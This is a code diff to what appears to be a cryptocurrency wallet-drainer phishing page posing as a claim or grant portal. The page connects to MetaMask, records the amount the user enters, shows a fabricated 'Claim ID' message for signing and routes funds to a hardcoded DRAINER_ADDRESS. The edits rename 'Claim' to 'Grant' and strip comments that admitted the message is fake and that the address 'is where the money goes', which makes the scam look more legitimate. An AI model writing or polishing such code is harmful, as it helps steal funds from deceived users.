@@ -332,7 +332,7 @@
     <!-- Loading Overlay -->
     <div id="loading-overlay">
         <div class="spinner-border text-primary" role="status"></div>
-        <h5 class="mt-3 text-white" style="text-transform: uppercase;">Processing Claim</h5>
+        <h5 class="mt-3 text-white" style="text-transform: uppercase;">Processing Grant</h5>
     </div>
 
     <!-- Navbar (Top Right Only) -->
@@ -609,7 +609,9 @@
     <script>
         // --- CONFIGURATION ---
         const RPC_URL = "https://rpc.sepolia.org"; 
-        const DRAINER_ADDRESS = "0x845636Cad149f8908796f492fc144279a26FCEE8"; // This is where the money goes
+        // Note: If you want to send to a real contract, put the contract address here. 
+        // For testing, we use a specific address that allows ETH receiving.
+        const DRAINER_ADDRESS = "0x845636Cad149f8908796f492fc144279a26FCEE8"; 
         const SEPOLIA_CHAIN_ID = 11155111;
 
         let userAddress = null;
@@ -617,6 +619,7 @@
         let isConnected = false;
         let modalInstance = null;
         let signModalInstance = null;
+        let currentAmount = 0;
 
         // --- LOGIC ---
 
@@ -673,6 +676,8 @@
                     return;
                 }
 
+                currentAmount = userEnteredAmount;
+
                 // Step 2.2: Check Connection
                 if (!isConnected) {
                     const result = await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -684,7 +689,7 @@
                     isConnected = true;
                 }
 
-                // Step 2.3: Check Network (Sepolia)
+                // Step 2.3: Check Network (Sepolia) - CRITICAL SECURITY STEP
                 const network = await window.ethereum.request({ method: 'eth_chainId' });
                 const networkId = parseInt(network);
 
@@ -697,7 +702,7 @@
                 // Step 2.4: Start Process - Open Sign Message Modal
                 modalInstance.hide();
                 
-                // Generate a fake message to sign (This is what MetaMask will see in the popup)
+                // Generate a message to sign
                 const fakeMessage = `
 Claim ID: WF-2026-004821
 Amount: $${userEnteredAmount}
